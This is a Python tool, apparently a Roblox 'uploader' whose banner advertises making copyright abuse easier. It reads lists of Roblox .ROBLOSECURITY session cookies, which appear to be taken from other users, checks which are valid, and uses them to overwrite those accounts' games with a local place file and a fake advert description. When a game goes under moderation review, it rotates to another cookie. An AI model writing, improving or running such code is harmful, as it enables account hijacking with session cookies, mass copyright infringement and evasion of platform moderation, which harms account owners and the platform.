import time
import random
import requests
import json
from colorama import Fore
import sys
import os

def main(cookie):
    try:
        token = requests.post("https://auth.roblox.com/v1/logout",
                              cookies={".ROBLOSECURITY": cookie}).headers['X-CSRF-TOKEN']

        userId = requests.get("https://users.roblox.com/v1/users/authenticated",
                              headers={'x-csrf-token': token, 'User-Agent': 'Roblox/WinINet'},
                              cookies={'.ROBLOSECURITY': cookie}).json()["id"]
        print(f" [DATA] {userId}- UserID")

        gameId = requests.get(f"https://inventory.roblox.com/v2/users/{userId}/inventory/9?limit=10&sortOrder=Asc",
                              headers={'x-csrf-token': token, 'User-Agent': 'Roblox/WinINet'},
                              cookies={'.ROBLOSECURITY': cookie}).json()["data"][0]["assetId"]
        print(f" [DATA] {gameId} - GameID")

        myfiles = open(r"C:\Users\vibro\Downloads\multiBOX\multiBOX\template\ExtraContent\places\v12.rbxl", "rb").read()

        unvid = "your_universe_id"  
        url = f"https://data.roblox.com/Data/Upload.ashx?assetid={gameId}"
        url2 = f"https://develop.roblox.com/v2/universes/{unvid}/configuration"  

        avatartype = "MorphToR15"
        allowprivateservers = False

        gamedata = {
            "name": "Brilliant, the learning platform.",
            "description": "Visit to get started learning STEM for free, and the first 200 people will get 20 percent off their annual premium subscription.",
            "universeAvatarType": avatartype,
            "universeAnimationType": "Standard",
            "maxPlayerCount": 1,
            "allowPrivateServers": allowprivateservers,
            "privateServerPrice": 0,
            "permissions": {"IsThirdPartyPurchaseAllowed": True}
        }
        gamedata = json.dumps(gamedata)

        gameData = requests.patch(url2,
                                  headers={'Content-Type': 'application/json',
                                           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
                                           'x-csrf-token': token},
                                  cookies={'.ROBLOSECURITY': cookie},
                                  data=gamedata)

        gameData2 = {"maxPlayerCount": 2}
        requests.patch(url2,
                       headers={'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
                                'x-csrf-token': token},
                       cookies={'.ROBLOSECURITY': cookie},
                       data=json.dumps(gameData2))

        print(f" [DATA] {gameData.status_code} - Successful upload")

        upload_url = f"https://roblox.com/games/{gameId}/zelenskyy-will-win"
        upload = requests.post(url,
                               headers={'Content-Type': 'application/xml',
                                        'User-Agent': 'Roblox/WinINet',
                                        'x-csrf-token': token},
                               cookies={'.ROBLOSECURITY': cookie},
                               data=myfiles)

        if upload.status_code == 200:
            print(f" [DATA] {upload_url} - Game Link")

        while True:
            time.sleep(60)
            cookie2 = "_2C2C510D4CD3626C2B967061FBFC4A5..."   
            sheesh = requests.get(f"https://games.roblox.com/v1/games/multiget-playability-status?universeIds={unvid}",
                                  headers={'x-csrf-token': token, 'User-Agent': 'Roblox/WinINet'},
                                  cookies={'.ROBLOSECURITY': cookie2}).json()[0]['playabilityStatus']

            if sheesh == 'UnderReview':
                start()

    except requests.exceptions.RequestException as req_err:
        print(f"Request failed: {req_err}")
    except Exception as e:
        print(f"An error occurred: {e}")

def start():
    k = 1
    filename = 'cookies.txt'
    with open(filename) as file:
        lines = file.read().splitlines()

    if len(lines) > k:
        random_lines = random.sample(lines, k)
        with open(filename, 'w') as output_file:
            output_file.writelines(line + "\n" for line in lines if line not in random_lines)
        main("\n".join(random_lines))
    elif lines:
        print("\n".join(lines))
        with open(filename, 'wb', 0):
            pass

def sendmsg():
    print(Fore.RED + '''                                                                     
            ╔═══════════════════════════════════════════════════════════════════════════════════════════════════════╗

                                                 Aimee's...
                                  ▒█░▒█ ▒█▀▀█ ▒█░░░ ▒█▀▀▀█ ░█▀▀█ ▒█▀▀▄ ▒█▀▀▀ ▒█▀▀█ 
                                  ▒█░▒█ ▒█▄▄█ ▒█░░░ ▒█░░▒█ ▒█▄▄█ ▒█░▒█ ▒█▀▀▀ ▒█▄▄▀ 
                    ░▀▄▄▀ ▒█░░░ ▒█▄▄█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▀ ▒█▄▄▄ ▒█░▒█
                                        Making copyright abuse easier for everyone ;)

                                         [1] Unblacklist/Unpatch         [2] Upload Game 
               v7.2.4                                                                           Remake by Aimee
            ╚═══════════════════════════════════════════════════════════════════════════════════════════════════════╝

        ''')
    input22 = input(" \n    Enter Task (1 or 2):  ")
    if input22 == "2":
        stuff = input("Please Insert Account Cookie: ")
        main(stuff)
        time.sleep(1)
        sendmsg()
    elif input22 == "1":
        print("This doesn't work")
        time.sleep(2)
        print("\n Error")
        time.sleep(1)
        sendmsg()
    elif input22 == "3":
        req = requests.Session()
        cookiefilefolder = os.path.dirname(__file__)
        cookiefile = (cookiefilefolder + "\cookies.txt")
        cookie = open(cookiefile).read().splitlines()
        validcount = 0
        invalidcount = 0

        if len(cookie) > 0:
            print(str(len(cookie)) + " Cookie(s) Found")
            print(" ")

            for line in cookie:
                check = req.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(line)})
                if check.status_code == 200:
                    validcount += 1
                else:
                    invalidcount += 1
            print(" Valid Cookie(s): " + str(validcount) + "\n Invalid Cookie(s):" + str(invalidcount))
            time.sleep(5)
            sendmsg()
        else:
            print(" No cookies found.")

if __name__ == "__main__":
    sendmsg()
